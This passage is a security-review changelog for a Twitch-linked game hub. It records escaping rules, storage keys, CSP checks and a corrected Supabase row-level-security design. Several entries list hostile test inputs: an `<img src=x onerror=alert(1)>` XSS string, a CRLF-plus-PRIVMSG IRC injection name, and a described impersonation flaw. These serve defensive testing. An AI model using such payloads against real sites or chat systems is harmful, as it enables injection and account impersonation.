- The summary/episode wording is built from page-owned phrases and counts; the only snapshot text shown is the
  chronicle line itself (text node) and, in options, a hero name.
- Checked: ?state=empty/fail/stale, ?mock=chronicle, ?mock=crowd, ?open=1 and ?mock=chronicle&away=6 with no page errors;
  the hostile `<img src=x onerror=alert(1)>` line renders as literal text (no `<img>` or `[onerror]` element), also
  as a hero filter value after a store-and-reload; innerHTML/outerHTML/eval counts unchanged from HEAD.

## H24 - the finder (page-local search)

- New input `#finderInput` and results list built ONLY with `el()`/`textContent`; a hero named `<img src=x onerror=alert(1)>` renders as text in the results (checked: 0 `<img>` in the list).
- No new fetch, origin, storage key, or CSP change (CSP byte-identical). No new innerHTML/outerHTML/insertAdjacentHTML/eval/new Function - grep shows only the two legacy page-owned-constant sites.
- A result chooses its target by integer (`data-fi`, `data-bi`, `#moment-<n>`); the only selector strings built are `[data-fi="<int>"]` / `[data-bi="<int>"]` from `| 0` integers. Snapshot strings are never used as URL, selector, src, href or style.
- The `/` shortcut is ignored when the event target is INPUT/TEXTAREA/SELECT/contentEditable, so it cannot steal typing from the guild chat.

## H25 - the Night Watch

- Presentation only: one class on `<html>`, CSS does the work. No new fetch, origin, `connect-src`, or CSP change (CSP byte-identical).
- New JS touches no snapshot value: `applyWatch()` sets `classList` and two fixed page-owned strings via `textContent`. No innerHTML/outerHTML/insertAdjacentHTML/eval/new Function added (counts unchanged from HEAD).
- One new storage key, `bellmire.watch.v1`, per-browser, never sent anywhere. It is read through `ctrlStrip`, length-capped, and compared to the single literal `"watch"`; the stored value is never used as a URL, selector, src, href or style. Verified: a stored `<img src=x onerror=alert(1)>` is ignored; a throwing `localStorage` leaves the full page.
- Hostile hero name `<img src=x onerror=alert(1)>` renders as literal text in the watch layout (Chronicle and Bands): 0 `<img>` elements, 0 alert calls, no page errors. `?state=empty|fail|stale`, `?mock=chronicle|crowd|bands|fallen`, `?open=1` all pass with and without `?watch=1`, at 1280 and 390, with no horizontal scroll.
- The page remains read-only; the toggle writes nothing outside this browser.

## H22 - the first minute (welcome block)

- Static copy lives in index.html; the single live line is built in `paintWelcome()` with `el()`/`textContent` only. The
  snapshot values it can show are numbers, a lore tier name from the page's own frozen lore, and one Chronicle line
  (attacker-controlled text: textContent only, capped at 140 characters, `overflow-wrap: anywhere`).
- No snapshot value is a URL, src, href or style. The doors carry a page-owned `data-door` id, `cleanTab()`-stripped and
  matched against the `TABS` whitelist before it selects a tab.
- localStorage key `bellmire.welcome.v1` holds only the literal `seen`; the value read back is control-stripped, capped and
  compared to that one literal before it decides anything. Storage that throws leaves the welcome showing.
- CSP byte-identical. No new fetch, no new origin, no viewer write path, no new innerHTML.

## H26 - journal fields from the publisher (D60)
New snapshot-controlled inputs: Chronicle row `day`, `kind`, `who`. Handling: `day` -> integer 0..999999 or null; `kind` -> /^[a-z0-9][a-z0-9_-]{0,23}$/ or ""
(anything else is untagged); `who` -> array of at most 6 strings, control chars stripped, 40 chars each. They are re-validated after the localStorage
round trip, rendered only via el() (textContent), never used as URL/src/href/style/class. `kind` only selects among page-owned topic tests. No CSP change,
no new fetch/origin, no write path. Hostile check: `?mock=journal` plants `<img src=x onerror=alert(1)>` in a `who` entry and a `kind` value - literal text / ignored.

## H27 - remembered town rolls (`bellmire.rolls.v1`)
New client-side store only: up to 100 normalized roll rows / 48 h / 60 KB in localStorage, read-only, per browser. Roll fields (`by`, `what`,
`result`, `cost`) are viewer-controlled text; they are re-validated after the storage round trip (normalizeRolls, control-char strip, `at` must match
an ISO regex else dropped, tier only via the page-owned TIER_ALIAS whitelist, face integer 1..20) and reach the DOM only through rollEntry() ->
el()/textContent. Crit/fumble classification picks a CSS class from page-owned constants; no roll field is ever a URL/src/href/style/selector. The
tally is computed counts rendered as text. No CSP change, no new fetch/origin, no write path. Hostile check: `?mock=roll` plants
`<img src=x onerror=alert(1)>` as a roller; a hand-tampered store with markup in by/what/tier/at also renders as literal text. Storage failures degrade to live-only.

## H28 - hero deep link (#hero-N)
- Only the URL fragment is read, and only if it matches `^hero-\d{1,10}$` (anything else beginning `hero-` simply matches nobody). The integer is only COMPARED to the same hash computed for each hero in the snapshot: never a selector, URL, src, href, style or markup. A hostile hero name yields a number; its sheet renders through el()/textContent (verified with `<img src=x onerror=alert(1)>`: no img element, no dialog, 0 page errors).
- The copy control writes a page-built string (page address + `#hero-` + integer) to the clipboard. No new fetch, origin or write path. CSP unchanged.

## H29 - the Shops tab (2026-11-16)

New surface: `renderShops(p)` in `web/app.js`, panel `#shops` in `web/index.html`, CSS appended to `style.css`.

- Every shop, item, cargo, order, walker and rarity string reaches the DOM only through `el()` (textContent). No innerHTML in the new code.
- No snapshot value is a URL, src, href, selector or style. A rarity string is matched to the page-owned set `SHOP_RARITY` before it picks a CSS class (`rar-<name>`); anything else gets no class and is shown as text. The shop glyph is chosen by a regex on the name but only from the `ICON_SET` whitelist (anvil or stall).
- CSP unchanged. No new fetch, no new origin. Item icons (D73, `assets/icons/items/`) are NOT used yet: they are not under `web/`, and drawing one means building an image path from a snapshot key. That would need a page-owned key whitelist and copied assets - flagged for supervisor review, not done.
- Payload gate: `KNOWN_V` now accepts "5". Contract read defensively: `p.shops[].stock`, `p.caravan` (or `p.trader`), `p.orders`. Absent fields give an honest "not published yet" state.
- Canary: `?mock=shops` (mixed levels, caravan present, hostile shop/item/cargo/order/rarity strings) and `?mock=shops1` (every shop level 1). The `<img onerror>`, `<b>` and `<script>` strings render as literal text; verified headless with zero dialogs and zero injected elements.

## H30 - Satchel tab: the only place a snapshot string LEAVES the page
Buttons send a chat command over the existing H6/H8 IRC socket. Built only by satCommand(): verb from a fixed table + one argument with all control chars (C0, DEL, C1, U+2028/9) replaced by spaces, whitespace collapsed, capped 80. No CR/LF can reach the socket, the message always starts with our verb (never "/" or a bare IRC line). Rate-limited 1.2 s; requires sign-in; stone needs a double press. Canary: ?mock=satchel has <img onerror> names and a name with CRLF + "PRIVMSG"; verified as text and single-line. CSP unchanged (byte-identical), no new scope, no innerHTML in the new code.

## H31 - the Season tab (2026-11-16)
- A fifteenth tab, read-only. It ranks `p.heroes` + `p.fallen` four ways (deepest, earned, died hardest,
  lived longest). No new fetch, no storage, no network, no CSP change, no new icon (reuses delve/coin/death/town).
- Every name, class, killer and number reaches the DOM only via `el()`/`textContent`; `coat()` takes the name as a
  hash input only. The bar fill is a CSSOM number clamped 0..1. No snapshot value is a URL, src, href, class or style.
- Optional fields read defensively (`earned|gold_earned|total_gold|lifetime_gold`, `days_alive|age_days|lived_days|age`,
  `born_day|joined_day|enlisted_day`); a board without data says so instead of guessing.
- Tested: `?mock=season` (full season, hostile name/class/killer), `season0` (empty), `season3` (v3, no age fields).
  Hostile `<img onerror>` renders as literal text, no dialog, no page errors.

## C-55 / C-61 rarity frame (2026-11-16)
`SHOP_RARITY` is now a Map from known rarity strings to page-owned class slugs
(common, uncommon, rare, very-rare, legendary, artifact; legacy "epic" aliases to very-rare).
"very rare" contains a space, so the snapshot string is never used as a class: only the slug
from the map is. Unknown values (including `<x>`) produce no class and render as text only.
The hub reads the stored `rarity` key and never bands anything by cost (C-61). No CSP change.

## H32 - the Twitch-shaped shell, the rail and the live stage (layout only)

Mr. E, 16 Nov: "make the hub feel like you are navigating on twitch." Reading: Twitch's navigation
grammar, not its colours or brand. **No new data, no new fetch, no CSP change.** Every invariant above
is unchanged; what this adds:

- **Shell (pass 1).** `index.html` is now a fixed top bar plus three columns (rail / stage / chat
  column). The page itself does not scroll (H13); the rail, the stage and the chat column each scroll
  inside themselves. Overlay and Night watch keep their old flow layouts.
- **The rail (pass 2)** is a `role="listbox"` (NOT a tablist) of `role="group"` / `role="option"`
  entries, roving tabindex, Up/Down/Home/End to move, Enter/Space to pick. It is built in
  `renderRail()` from `p.heroes` and `p.parties`, which the page already holds. Every name and line is
  set through `el()` / textContent. `sigil(name)` only hashes a name to choose a known drawing. The
  HP and LIVE fills are CSSOM numbers. The selection (`railSel`) is a JS variable holding a lower-cased
  name that is only ever COMPARED against snapshot names - never used in a selector, URL, src, href or
  style; DOM entries are addressed by an integer index the page owns (`data-ri`). The collapsed state is
  one whitelisted localStorage value (`bellmire.rail.v1` = `min` | `full`).
- **The live stage** (new first tab "Live") reuses `heroSheet()` / `partyCard()` and adds an info row
  and a Follow toggle that calls the existing `setMyHero()` (the H11 pin). No other state is added.
- **Colour.** One new functional colour: `--live` (a red LIVE dot and badge), used for nothing else.
- No `innerHTML` was added anywhere in this item; the only `innerHTML` in the file is still the
  page-owned `renderNothing` template.

### H32 pass 3 - the guild chat column

The H8 native chat moved from tab fourteen into a persistent right column (same element ids, same
code). **Still strictly opt-in**: nothing contacts `wss://irc-ws.chat.twitch.tv` until the viewer presses
"Open the guild chat"; reading is anonymous; sending still needs the viewer's own sign-in. Every incoming
line still renders through `el()` / textContent (`?mock=chat` hostile line renders as literal text, no
dialog). The `chat` tab and its `<section>` were removed (the column replaces them). New stored state: one
whitelisted localStorage value, `bellmire.chatcol.v1` = `min` | `full` (the collapse choice). No CSP change.

### H32 pass 4 - item pictures: the whitelist rule extended from a glyph id to a file path

Supervisor sign-off (2026-11-16 20:05 CT, docs/WORK_PLAN.md) with four conditions, all met:

- **The rule.** A snapshot item NAME never becomes a URL. `itemIconFile(name)` control-strips, collapses
  whitespace and lower-cases the name, looks it up in `ITEM_ICONS` (a `Map`), and builds the path from the
  Map's page-constant value (`"icons/items/" + "ring/architect_ring" + ".webp"`). A miss returns `""` and the
  card falls through to the whitelisted SVG glyph `loot` - never a guessed path, never a broken `<img>`.
  No `onerror` handler anywhere (the page is el()-only; onerror is markup). `alt` is set as text. The one
  `<img>` is created with `document.createElement`, `width`/`height` attributes, `loading="lazy"`.
- **CSP unchanged.** `img-src 'self' data:` already serves a same-origin file. No host added.
- **1. Derived thumbnails, one size.** 160 px WebP (q85) = 2x the largest displayed box (80 px, the hover
  preview; the grid box is 64 px). **Measured: 463 files, 2,038,188 bytes (1.94 MB) of images; the directory
  with the manifest is 2.12 MB. Budget 6 MB.** The originals (22,302,016 bytes) are untouched.
- **2. One command.** `python3 web/tools/make_item_icons.py [--commit <art-sha>]` reads `assets/icons/items/`
  and `data/items.json` (read-only), writes `web/icons/items/`, exits non-zero if over 6 MB.
- **3. Generated whitelist.** The same script writes `web/icons/items/_manifest.json` (source commit
  `7c9b90f93a19089e0c39cca310ed35c703caad12`, thumb size, byte total, file list, name map, conflicts) and
  rewrites the block between the `ITEM_ICONS:BEGIN/END` markers in `app.js` from it. 462 names, one name clash
  ("Scarglass Ring": `ring/scar_ring` kept, `ring/scarglass_ring` dropped, recorded in the manifest).
  Re-run it when the art lane regenerates; nothing is hand-typed.
- **4. Fixed boxes.** Every picture sits in a fixed 64 px (80 px in the preview) square, so a lazy image cannot
  reflow the grid; the stage scrolls internally.
- Preview = an overlay inside the card; Bestiary and Lore became browse cards (no new data). Rarity is a
  frame (border), never a fill.
- Note: shop stock goods (pies, brooms) are not in `data/items.json` equipment, so they honestly show the glyph;
  only items that have art (rings, hats, boots, cloaks, gloves, amulets, banners) show a picture.

## H32 pass 5 (polish) - no security surface change
Added a skip link (constant href "#stageScroll"), three key shortcuts ("[", "]", "g") that only toggle page-owned layout state or focus the rail, a scrollIntoView on the active tab (an id from the TABS constant) and CSS. No snapshot value reaches a selector, URL, src, href or style; no new innerHTML; no new storage key; CSP meta unchanged.

## System 41 section 1 - chamber-holder Bestiary (2026-11-27)
New surface: <img src="icons/beasts/<key>.webp"> where <key> comes ONLY from the generated BEAST_DEX constant (web/tools/make_bestiary.py); a snapshot value can only select which listed key is drawn (hero.beasts keys are looked up with hasOwnProperty, never concatenated into a path). Snapshot strings (mechanic, drops, counts) reach the DOM through el()/textContent; verified with a hostile mechanic and drop name. Silhouette is CSS only. No new innerHTML, storage key or CSP change (img-src 'self' already allows it). Undiscovered beasts' names are excluded from the finder.

## H33 - the room at the inn: Supabase Auth (Twitch) + the hub_actions queue (28 Nov 2026)

The hub now signs viewers in and WRITES. Everything above still holds; this adds to it.

- **No CSP change.** Sign-in is a top-level navigation to `<supabase>/auth/v1/authorize?provider=twitch&flow_type=pkce...`
  (navigation is not governed by connect-src) and the code exchange, refresh, logout and settings probe are `fetch` calls to
  the one Supabase origin connect-src already lists. No SDK, no new script, no new origin. The CSP meta is byte-identical.
- **Keys.** Only the publishable key and the viewer's own session reach web/. The session ({access_token, refresh_token,
  expires_at, user}) is kept in `localStorage["bellmire.auth"]` (per-viewer convenience, wrapped in try/catch) and the PKCE
  verifier in `sessionStorage`. The token is never rendered, logged or put in a URL. Residual risk: an XSS would read it -
  which is why the strict CSP and the el()-only rule are the wall. No service key, no secret, ever.
- **Flow.** PKCE (S256), so no token ever appears in the URL; `?code=` is stripped with `history.replaceState` on return.
  The sign-in button is shown only when `/auth/v1/settings` reports `external.twitch === true`; otherwise the page says
  sign-in is not switched on. It never offers a button that leads to a Supabase error page.
- **RLS is the authority** (policy assumed, in `web/tools/hub_actions_schema.sql`, NOT yet applied to the live project):
  `hub_actions` has RLS on; authenticated users may SELECT only rows whose `twitch_id` equals their own Twitch id, read from `auth.identities` by a SECURITY DEFINER function `private.my_twitch_id()`, and INSERT only with that same `twitch_id`, `status='queued'`, `result is null`, under a
  20-queued-rows backlog cap; there is NO update or delete policy, and anon has none. `kind` is a CHECK whitelist and `args`
  is size-bounded in the database, so a page that is tampered with still cannot file anything the table forbids. The page
  sends a `viewer_login` for display only; the engine must key on `twitch_id`, never on that string.
- **An action is a request.** The page shows queued/done/refused only from the `status` column the engine writes, maps any
  other value to "Unknown", and says in words that a filed request is not a result. The "15-30 seconds" note is carried.
- **DOM.** Display name, snapshot hero fields, queue `kind`/`args`/`result` all go through `el()`/textContent; verified with a
  hostile display name (`<img src=x onerror=alert(1)>`) and a hostile engine `result` string - both render as text, zero
  injected elements, no dialog. No innerHTML added (the two page-owned sites are unchanged). No browser dialog is used;
  "specialize" asks for a second press instead.
- **Login button.** The page's own teal chip reading "Log in with Twitch". No purple, no glyph, no wordmark.
- **Needs doing outside web/** (not this lane): enable the Twitch provider + redirect URL allow-list in Supabase; apply the
  schema; the game engine polls `status='queued'` with the service key and writes `status`/`result`.

### H33b - RLS identity source corrected (28 Nov 2026, 01:5x CT)
Self-caught flaw in the H33 proposal: it compared `twitch_id` to `auth.jwt() -> 'user_metadata' ->> 'provider_id'`. `user_metadata`
is user-writable (`auth.updateUser`), so a signed-in viewer could set it to another viewer's Twitch id and read or file as them.
`web/tools/hub_actions_schema.sql` now derives the id from `auth.identities` through `private.my_twitch_id()` (SECURITY DEFINER,
empty search_path, execute granted to `authenticated` only, returns only the caller's own id). `twitch_id` default and both
policies use it. **Still NOT applied to the live project** (not this lane); whoever applies it must apply THIS version, and should
test with a second account that `updateUser({data:{provider_id:'x'}})` changes nothing. No web/*.js, CSS or CSP change.
